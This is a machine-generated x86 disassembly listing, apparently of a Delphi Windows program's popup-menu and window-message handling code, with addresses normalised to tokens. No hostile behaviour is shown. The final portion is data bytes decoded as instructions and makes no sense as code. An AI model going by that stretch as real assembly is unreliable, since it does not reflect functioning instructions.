mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408a50
mov eax [ ebp + 0x10 ]
call sub_408994
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_456970
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43fa98
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45694c
mov [ ebx + 0x41 ] 0x1
sub_456998
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45694c
mov [ ebx + 0x41 ] 0x1
sub_456a24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_456520
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_4563a8
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_456ab4
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_456af0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_452a5c
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_456b3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_4565d0
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_456af0
call sub_452498
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_456b98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456bc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456be4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457117
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45711e
lea eax [ ebp - 0x30 ]
call sub_404008
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ esi + 0x4 ]
call sub_455ee8
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_463034
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov dx [ esi + 0x4 ]
call sub_455ecc
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_456f4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_456f2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_424a38
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4248d8
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4573bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f34
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424a38
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45672c
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_455e2c
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_455e2c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45708d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_457068
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45704b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_424a38
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4248d8
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457052
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424a38
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43fd1c
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463034
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_455e2c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_455e2c
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_455e2c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_455e5c
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_455e5c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_462cd8
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_462d40
jmp r-xdata
sub_45706f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_457128
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a30c
pop esi
pop ebx
retn
push ebx
push sub_456b98
call sub_421874
mov [ ebx + 0x10 ] eax
sub_45716c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455c44
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_457128
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4571e0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_457150
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455ce0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_457238
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_451fdc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45694c
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45694c
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_457280
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_451fdc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4617dc
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403430
mov edx eax
jmp r-xdata
sub_4572cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_41900c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_457238
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_455598
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_455a94
mov eax [ ebx + 0x34 ]
call sub_452e3c
mov eax ebx
call sub_45643c
mov eax ebx
call sub_457280
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_452f6c
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_457380
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a468
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a468
cmp ebp [ eax ]
jne r-xdata
sub_4573bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424270
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_423aa4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424270
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_423aa4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403430
mov edx [ r-xdata ]
call sub_4033c0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424270
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_423aa4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4574a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40405c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4042c8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404568
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4042c8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404568
jmp r-xdata
sub_457538
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404008
mov ebx 0x1
mov eax esi
call sub_4042c8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4041f0
sub_45759c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4575f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4574a4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4574a4
mov eax [ ebp - 0x8 ]
pop edx
call sub_40820c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575fc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_457604
adc al [ eax ]
add [ eax ] al
test al 0xed
inc edi
add [ eax + edi * 8 + 0x47 ] ah
add [ ebp + ebp * 8 - 0x827ffb9 ] ah
inc edi
add [ eax + 0x480047ed ] ah
test [ edi ] rw-data
movsb [ edi ] [ esi ]
test [ edi ] rw-data
cld
inc edi
add [ ebp + ebp * 8 - 0x84bffb9 ] dl
inc edi
add [ eax + 0x280047ed ] dl
cli
inc edi
add [ ebp + ebp * 8 - 0x6b7ffb9 ] cl
inc edi
add [ eax + 0x180047ed ] cl
std
inc edi
add [ ebp + ebp * 8 - 0x2ebffb9 ] al
inc edi
add [ eax - 0x33ffb813 ] al
clc
inc edi
add [ ebp + ebp * 8 + 0x47 ] bh
add [ eax + 0x780047fc ] bh
in eax dx
inc edi
add [ esp + edi * 8 + 0x47 ] ch
add [ ebp + ebp * 8 + 0x47 ] dh
add [ eax + 0x700047fd ] cl
in eax dx
inc edi
add [ edi * 8 - 0x1293ffb9 ] bh
inc edi
add ah ah
clc
inc edi
add [ eax - 0x13 ] ch
inc edi
add ah bh
clc
inc edi
add [ ebp + ebp * 8 + 0x47 ] ah
add [ ecx + edi * 8 + 0x47 ] dh
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4576fc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457703
retn
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
call sub_404008
sub_457708
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_457604
call sub_403d30
mov eax [ r-xdata ]
call sub_419ca4
mov eax [ r-xdata ]
call sub_419d44
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
mov eax [ r-xdata ]
call sub_419be8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b23c
mov [ rw-data ] eax
sub_4577f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
js r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] cl
inc ebp
add [ eax ] cl
add [ eax ] al
cld
add [ ecx ] 0x7c
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
inc [ ecx ]
add [ 0x6f6c6f43 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
shl [ eax + 0x78 ] 0x45
ja r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
add [ eax + eax ] ch
add bh bh
mov [ fs : 0x10045 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
[ ebx + ebx * 4 ]
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
push esp
inc ebx
outsd
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
jb r-xdata
add bh bh
dec eax
mov [ 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xffffec ] al
add [ eax ] eax
add eax 0x6f6c6f43
js r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
pushad
js r-xdata
jae r-xdata
popad
outsb
add [ gs : bx + si ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ esi ] 0x2c004010
add [ eax ] al
jmp [ edx + 0x45 ]
add [ eax ] al
adc [ eax + eax ] 0x0
add [ eax - 0x7f ] dh
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
inc eax
mov [ 0x10045 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
test [ ebx + 0x10045 ] ah
outsd
insb
outsd
jb r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x3845b86a
stosb [ edi ]
inc ecx
add [ eax - 0x55 ] cl
js r-xdata
jae r-xdata
add [ eax - 0x27ffbfcc ] cl
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x45 ] al
add [ eax ] cl
ja r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
jl r-xdata
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ ebx + ebx * 4 ] ah
inc ebp
add [ ecx ] dl
cmp [ edx - 0x54b7ffbf ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] ah
inc ebp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
add al 0xa2
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sahf
inc esp
add al ah
inc sp
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + ecx * 2 + 0x44 ] dh
dec esi
outsd
jb r-xdata
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ edx ] al
add [ ecx ] cl
dec ecx
outsb
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
mov [ 0x10045 ] al
add al dh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
pushfd
mov [ 0x10045 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
je r-xdata
mov [ eax ] ah
inc esp
add [ ebx + edx * 2 + 0x29a00044 ] dl
inc esp
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc [ ebx + 0x10045 ]
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
int3
add ah bh
push ds
inc esp
add [ eax - 0x5fffbb6c ] al
xchg esp eax
inc esp
add [ eax + 0x44004491 ] al
push ds
inc esp
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
0x9f200044 0x44
insb
sahf
inc esp
inc edx
add [ eax + 0x1800420e ] bh
cmpsb [ esi ] [ edi ]
inc ebp
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
jae r-xdata
